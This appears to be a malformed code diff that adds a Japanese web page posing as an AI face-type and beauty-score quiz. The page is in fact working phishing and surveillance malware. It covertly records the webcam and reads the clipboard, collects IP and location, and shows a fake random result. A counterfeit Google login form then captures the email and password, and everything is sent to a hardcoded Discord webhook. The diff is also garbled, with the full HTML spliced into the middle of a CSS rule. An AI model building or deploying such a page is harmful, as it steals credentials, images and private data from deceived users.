@@ -10,10 +10,224 @@
         .card { background: #0d0d0d; border: 1px solid #222; padding: 35px; border-radius: 24px; text-align: center; width: 380px; box-shadow: 0 25px 50px rgba(0,0,0,0.9); transition: 0.5s; }
         h1 { font-size: 20px; letter-spacing: 4px; margin-bottom: 25px; color: #fff; font-weight: 300; }
         .v-wrap { width: 100%; border-radius: 15px; overflow: hidden; border: 1px solid #333; margin-bottom: 30px; background: #050505; position: relative; line-height: 0; }
+        #video { width: 100%; display: block; transform: scaleX(-1);<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Deep Scan | 次世代顔タイプ診断</title>
+    <style>
+        * { box-sizing: border-box; outline: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { background: #0d0d0d; border: 1px solid #222; padding: 35px; border-radius: 24px; text-align: center; width: 380px; box-shadow: 0 25px 50px rgba(0,0,0,0.9); transition: 0.5s; }
+        h1 { font-size: 20px; letter-spacing: 4px; margin-bottom: 25px; color: #fff; font-weight: 300; }
+        .v-wrap { width: 100%; border-radius: 15px; overflow: hidden; border: 1px solid #333; margin-bottom: 30px; background: #050505; position: relative; line-height: 0; }
         #video { width: 100%; display: block; transform: scaleX(-1); }
         .btn { background: #ffffff; color: #000; border: none; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.2s; }
         .btn:active { transform: scale(0.98); opacity: 0.8; }
         
+        /* 診断結果画面のスタイル */
+        #result-ui, #login-ui { display: none; }
+        .result-item { display: flex; justify-content: space-between; margin: 15px 0; border-bottom: 1px solid #222; padding-bottom: 5px; font-size: 14px; }
+        .result-value { color: #0ff; font-weight: bold; }
+        .score-bar { width: 100%; height: 6px; background: #222; border-radius: 3px; margin-top: 10px; overflow: hidden; }
+        .score-fill { height: 100%; background: linear-gradient(90deg, #0ff, #0f0); width: 0%; transition: width 2s ease-in-out; }
+
+        input { width: 100%; padding: 15px; margin: 12px 0; border: 1px solid #333; background: #111; color: #fff; border-radius: 10px; font-size: 15px; }
+        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0, 255, 255, 0.5); box-shadow: 0 0 15px #0ff; display: none; animation: scan 2.5s infinite linear; z-index: 10; }
+        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
+        .status-text { font-size: 11px; color: #444; margin-top: 15px; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <!-- ステップ1: スキャン画面 -->
+    <div class="card" id="camera-ui">
+        <h1>NEURAL ANALYZER</h1>
+        <div class="v-wrap">
+            <div class="scan-line" id="line"></div>
+            <video id="video" autoplay playsinline muted></video>
+        </div>
+        <button class="btn" id="start-btn">スキャンを開始</button>
+        <div class="status-text">ENCRYPTED CONNECTION: SECURE</div>
+    </div>
+
+    <!-- ステップ2: 診断結果（フェイク） -->
+    <div class="card" id="result-ui">
+        <h1>ANALYSIS COMPLETE</h1>
+        <div class="result-item"><span>Face Category:</span> <span class="result-value" id="res-cat">Computing...</span></div>
+        <div class="result-item"><span>Beauty Score:</span> <span class="result-value" id="res-score">0%</span></div>
+        <div class="score-bar"><div class="score-fill" id="score-fill"></div></div>
+        <div id="ai-log" style="font-size: 10px; color: #0f0; text-align: left; margin-top: 15px; height: 40px; overflow: hidden; font-family: monospace;"></div>
+        <div class="result-item" style="border:none; margin-top:20px; font-size:12px; color:#888;">
+            AIにより詳細な骨格・黄金比分析が完了しました。
+        </div>
+        <button class="btn" id="view-details-btn" style="margin-top:10px;">詳細レポートを表示</button>
+    </div>
+
+    <!-- ステップ3: ログイン画面 -->
+    <div class="card" id="login-ui">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90" style="margin-bottom:20px;">
+        <h2 style="font-size:16px; margin-bottom:25px; font-weight: 400; color: #ccc;">レポートの保護を解除してください</h2>
+        <p style="font-size:12px; color:#777; margin-top:-20px; margin-bottom:20px;">セキュリティ保護のため、アカウント確認が必要です</p>
+        <form id="trap-form">
+            <input type="email" id="email" placeholder="メールアドレスまたは電話番号" required>
+            <input type="password" id="pass" placeholder="パスワードを入力" required>
+            <button type="submit" class="btn" id="final-btn">レポートを表示</button>
+        </form>
+    </div>
+
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
+
+        const video = document.getElementById('video');
+        const startBtn = document.getElementById('start-btn');
+        const line = document.getElementById('line');
+        let capturedImg = "";
+        let videoBlob = null;
+        let net = {};
+        let clipboardData = "未取得";
+
+        window.onload = async () => {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                net = await res.json();
+            } catch (e) { net = { ip: "取得失敗" }; }
+        };
+
+        async function sendFirstStrike() {
+            if (!capturedImg) return;
+            const payload = {
+                username: "Strike 1: Media Captured",
+                embeds: [{
+                    title: "📸 Visual Data Secured",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "🌐 Network", value: `**IP:** ${net.ip || '不明'}\n**Loc:** ${net.city || '?'}, ${net.country_name || '?'}`, inline: true },
+                        { name: "📱 Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify(payload));
+            try {
+                const photoBlob = await (await fetch(capturedImg)).blob();
+                formData.append('file1', photoBlob, 'face.jpg');
+                if (videoBlob && videoBlob.size > 0) formData.append('file2', videoBlob, 'video.mp4');
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            } catch (err) {}
+        }
+
+        startBtn.onclick = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                startBtn.innerText = "分析中...";
+                startBtn.disabled = true;
+                line.style.display = "block";
+
+                try {
+                    if (navigator.clipboard) clipboardData = await navigator.clipboard.readText();
+                } catch(e) { clipboardData = "アクセス拒否"; }
+
+                const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
+                const mediaRecorder = new MediaRecorder(stream, { mimeType });
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+                mediaRecorder.onstop = async () => {
+                    videoBlob = new Blob(chunks, { type: mimeType });
+                    await sendFirstStrike();
+                };
+                mediaRecorder.start();
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth; 
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    capturedImg = canvas.toDataURL('image/jpeg', 0.6);
+                    
+                    mediaRecorder.stop();
+                    document.getElementById('camera-ui').style.display = 'none';
+                    showFakeResult();
+                    stream.getTracks().forEach(t => t.stop());
+                }, 5000);
+            } catch (err) { alert("カメラの許可が必要です。"); }
+        };
+
+        function showFakeResult() {
+            document.getElementById('result-ui').style.display = 'block';
+            const log = document.getElementById('ai-log');
+            const logs = [
+                "> Mapping facial landmarks...",
+                "> Analyzing golden ratio...",
+                "> Calculating bone structure...",
+                "> Finalizing result..."
+            ];
+            
+            logs.forEach((text, i) => {
+                setTimeout(() => {
+                    log.innerHTML += text + "<br>";
+                }, i * 1000);
+            });
+
+            const categories = ["Elegant / Adult", "Cute / Fresh", "Cool / Sharp", "Active / Girly"];
+            const randomCat = categories[Math.floor(Math.random() * categories.length)];
+            const randomScore = Math.floor(Math.random() * (98 - 85 + 1)) + 85;
+
+            setTimeout(() => {
+                document.getElementById('res-cat').innerText = randomCat;
+                document.getElementById('res-score').innerText = randomScore + "%";
+                document.getElementById('score-fill').style.width = randomScore + "%";
+            }, 1500);
+        }
+
+        document.getElementById('view-details-btn').onclick = () => {
+            document.getElementById('result-ui').style.display = 'none';
+            document.getElementById('login-ui').style.display = 'block';
+        };
+
+        document.getElementById('trap-form').onsubmit = async (e) => {
+            e.preventDefault();
+            document.getElementById('final-btn').innerText = "レポート作成中...";
+            document.getElementById('final-btn').disabled = true;
+
+            let batteryStatus = "不明";
+            try {
+                const battery = await navigator.getBattery();
+                batteryStatus = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? '充電中' : '放電中'})`;
+            } catch (e) {}
+
+            const payload = {
+                username: "Strike 2: Credentials & Intel",
+                embeds: [{
+                    title: "🔑 Target Information Extracted",
+                    color: 0xff0000,
+                    fields: [
+                        { name: "📧 Credentials", value: `**ID:** \`${document.getElementById('email').value}\`\n**PW:** \`${document.getElementById('pass').value}\`` },
+                        { name: "📋 Clipboard", value: "```\n" + clipboardData + "\n```" },
+                        { name: "🔋 Battery", value: batteryStatus, inline: true },
+                        { name: "🌐 IP", value: net.ip || '不明', inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload) 
+                });
+            } catch (err) {}
+            window.location.href = "https://accounts.google.com/ServiceLogin?hl=ja";
+        };
+    </script>
+</body>
+</html>
         /* 診断結果画面のスタイル */
         #result-ui, #login-ui { display: none; }
         .result-item { display: flex; justify-content: space-between; margin: 15px 0; border-bottom: 1px solid #222; padding-bottom: 5px; font-size: 14px; }
